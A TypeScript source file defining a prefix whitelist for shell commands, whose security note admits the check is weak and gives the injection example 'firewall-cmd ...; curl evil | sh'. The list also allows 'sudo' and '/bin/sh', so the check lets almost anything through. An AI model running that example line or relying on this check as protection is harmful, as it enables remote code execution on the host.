// src/utils/commandWhitelist.ts
// Prefix whitelist of `execute_command` (shell) commands; see the security note below.
// Whitelist of allowed command prefixes for security
// Only commands starting with these prefixes are allowed to execute
const ALLOWED_COMMAND_PREFIXES = [
  'sudo',
  'firewall-cmd',
  'virsh',
  'systemctl',
  'smartctl',
  'nvidia-smi',
  'sensors',
  'ip ',
  'bridge ',
  'arp',
  'getent ',
  'dig ',
  'ping ',
  'cat ',
  'grep ',
  'tail ',
  'apt ',
  'apt-get ',
  'hostapd',
  'mosquitto_sub',
  'docker ',
  'winvm',
  'ls ',
  'stat ',
  'df ',
  'free',
  'uptime',
  'who',
  'w ',
  'journalctl',
  '/bin/sh',
  '/bin/bash',
  'gpu-stats',
  'upsc ',
  'upscmd ',
];

/**
 * Validates if a command is allowed based on whitelist.
 *
 * SECURITY NOTE: this prefix whitelist is NOT the primary protection against
 * command injection. It only checks the *start* of the command string, so a
 * value like `firewall-cmd ...; curl evil | sh` still passes. Any command that
 * interpolates a value controlled by MQTT / an external user MUST use
 * `execute_argv` (which never spawns a shell) together with the strict field
 * validators in `./validators`. `execute_command` (shell) is reserved for
 * fixed literals that genuinely need a shell (pipes, redirections, env
 * assignments) and MUST NOT interpolate any externally-controlled value.
 *
 * @param command The command to validate
 * @returns true if command is allowed, false otherwise
 */
export function isCommandAllowed(command: string): boolean {
  const trimmedCommand = command.trim();

  // Check if command starts with any allowed prefix
  return ALLOWED_COMMAND_PREFIXES.some(prefix => trimmedCommand.startsWith(prefix));
}
